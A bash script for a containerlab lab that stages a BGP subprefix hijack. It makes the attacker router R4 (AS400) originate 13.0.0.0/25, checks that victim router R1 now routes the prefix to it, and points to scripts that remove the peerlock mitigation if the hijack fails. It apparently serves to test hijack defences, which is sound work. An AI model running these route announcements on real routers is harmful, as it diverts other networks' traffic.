#!/bin/bash
# Start subprefix hijack (13.0.0.0/25) from attacker (AS400).
set -euo pipefail

if ! command -v docker >/dev/null 2>&1; then
  echo "[FAILED] docker CLI not found in PATH. Install Docker or run from an environment with Docker available."
  exit 1
fi

find_node() {
  local suffix="$1"
  docker ps --format '{{.Names}}' | grep -E '^clab-.*-'"${suffix}"'$' | head -n1
}

R1="$(find_node r1)"
R4="$(find_node r4)"

if [ -z "$R1" ] || [ -z "$R4" ]; then
  echo "[ERROR] Lab containers not running. Deploy a topology first (containerlab deploy), then retry."
  exit 1
fi

echo "[INFO] R1=$R1"
echo "[INFO] R4=$R4"
echo "[INFO] Announcing 13.0.0.0/25 from AS400 (subprefix hijack)"

echo "[INFO] Checking BGP session status (R1<->R4)"
docker exec "$R1" vtysh -c "show bgp summary" 2>/dev/null | grep -E "10\.14\.0\.2" || true
docker exec "$R4" vtysh -c "show bgp summary" 2>/dev/null | grep -E "10\.14\.0\.1" || true

if ! docker exec "$R1" vtysh -c "show bgp neighbor 10.14.0.2" 2>/dev/null | grep -qi "BGP state = Established"; then
  echo "[FAILED] R1->R4 BGP session is not Established; subprefix cannot propagate."
  docker exec "$R1" vtysh -c "show bgp neighbor 10.14.0.2" 2>/dev/null | grep -i "BGP state" || true
  exit 1
fi

if ! docker exec "$R4" vtysh -c "show bgp neighbor 10.14.0.1" 2>/dev/null | grep -qi "BGP state = Established"; then
  echo "[FAILED] R4->R1 BGP session is not Established; subprefix cannot propagate."
  docker exec "$R4" vtysh -c "show bgp neighbor 10.14.0.1" 2>/dev/null | grep -i "BGP state" || true
  exit 1
fi

HIJACK_IF="hijack0"

echo "[INFO] Creating $HIJACK_IF on R4 and assigning 13.0.0.1/25 (forces a connected route)"
docker exec "$R4" ip link add "$HIJACK_IF" type dummy 2>/dev/null || true
docker exec "$R4" ip link set "$HIJACK_IF" up 2>/dev/null || true
docker exec "$R4" ip addr add 13.0.0.1/25 dev "$HIJACK_IF" 2>/dev/null || true

if ! docker exec "$R4" ip -o addr show dev "$HIJACK_IF" 2>/dev/null | grep -q "13\.0\.0\.1/25"; then
  echo "[FAILED] Could not configure 13.0.0.1/25 on R4 $HIJACK_IF."
  docker exec "$R4" ip -o link show "$HIJACK_IF" 2>/dev/null || true
  docker exec "$R4" ip -o addr show dev "$HIJACK_IF" 2>/dev/null || true
  exit 1
fi

echo "[INFO] Verifying R4 has connected route 13.0.0.0/25"
R4_CONNECTED=$(docker exec "$R4" ip route show 13.0.0.0/25 2>/dev/null || true)
echo "$R4_CONNECTED"
if [ -z "$R4_CONNECTED" ]; then
  echo "[FAILED] R4 does not have 13.0.0.0/25 in kernel main table after configuring $HIJACK_IF."
  docker exec "$R4" ip -o addr show dev "$HIJACK_IF" 2>/dev/null || true
  docker exec "$R4" ip route show 13.0.0.0/0 2>/dev/null | head -n 50 || true
  exit 1
fi

echo "[INFO] Verifying FRR (zebra) sees 13.0.0.0/25 on R4"
R4_FRR_RIB=$(docker exec "$R4" vtysh -c "show ip route 13.0.0.0/25" 2>/dev/null || true)
echo "$R4_FRR_RIB"
if echo "$R4_FRR_RIB" | grep -qi "Network not in table"; then
  echo "[FAILED] FRR does not see 13.0.0.0/25 in its RIB on R4 (zebra import issue)."
  exit 1
fi

echo "[INFO] Injecting 13.0.0.0/25 into BGP on R4 via network statement"
docker exec "$R4" vtysh \
  -c "configure terminal" \
  -c "router bgp 400" \
  -c "no network 13.0.0.0/24" \
  -c "end" >/dev/null 2>&1 || true

VTSH_OUT=$(docker exec "$R4" vtysh \
  -c "configure terminal" \
  -c "router bgp 400" \
  -c "no bgp network import-check" \
  -c "network 13.0.0.0/25" \
  -c "end" 2>&1) || {
  echo "[FAILED] vtysh failed while configuring R4 to originate 13.0.0.0/25."
  echo "$VTSH_OUT"
  exit 1
}

if ! docker exec "$R4" vtysh -c "show running-config" 2>/dev/null | grep -q "network 13\.0\.0\.0/25"; then
  echo "[FAILED] R4 running-config does not contain 'network 13.0.0.0/25' after vtysh config."
  echo "[INFO] vtysh output:" 
  echo "$VTSH_OUT"
  echo "[INFO] R4 BGP section (router bgp 400):"
  docker exec "$R4" vtysh -c "show running-config" 2>/dev/null | sed -n '/^router bgp 400/,/^!/p' || true
  exit 1
fi

sleep 2

echo "[INFO] Confirming R4 is originating 13.0.0.0/25"
R4_OUT=$(docker exec "$R4" vtysh -c "show bgp ipv4 unicast 13.0.0.0/25" 2>/dev/null || true)
echo "$R4_OUT"

if echo "$R4_OUT" | grep -qi "% Network not in table"; then
  echo "[FAILED] R4 did not originate 13.0.0.0/25 (not in its BGP table)."
  echo "[INFO] R4 $HIJACK_IF addresses:"
  docker exec "$R4" ip -o addr show dev "$HIJACK_IF" 2>/dev/null || true
  echo "[INFO] R4 kernel route for 13.0.0.0/25:"
  docker exec "$R4" ip route show 13.0.0.0/25 2>/dev/null || true
  echo "[INFO] R4 BGP config (router bgp 400 section):"
  docker exec "$R4" vtysh -c "show running-config" 2>/dev/null | sed -n '/^router bgp 400/,/^!/p' || true
  echo "[HINT] If FRR still won't originate, verify the route appears in FRR RIB:"
  echo "       docker exec $R4 vtysh -c 'show ip route 13.0.0.0/25'"
  exit 1
fi

sleep 15

echo "[INFO] R1 BGP view for /25:" 
docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/25" || true

echo "[INFO] R1 forwarding decision for /25:" 
docker exec "$R1" vtysh -c "show ip route 13.0.0.0/25" || true

if docker exec "$R1" vtysh -c "show ip route 13.0.0.0/25" 2>/dev/null | grep -q "10.14.0.2"; then
  echo "[SUCCESS] Subprefix hijack succeeded (R1 /25 next-hop is attacker 10.14.0.2)."
  exit 0
fi

echo "[FAILED] Subprefix hijack did NOT take over on R1."

echo "[INFO] Diagnosing likely filter on R1 (mitigation/peerlock)"
docker exec "$R1" vtysh -c "show running-config" 2>/dev/null | grep -E "neighbor 10\.14\.0\.2 route-map" || true
docker exec "$R1" vtysh -c "show ip prefix-list BLOCK_VICTIM" 2>/dev/null || true
docker exec "$R1" vtysh -c "show ip prefix-list VICTIM_PREFIXES" 2>/dev/null || true

echo "[HINT] If mitigation is enabled, disable it and retry:"
echo "       bash scripts/remove_mitigation.sh"
echo "       bash scripts/scripts/v3_remove_peerlock.sh"
exit 1
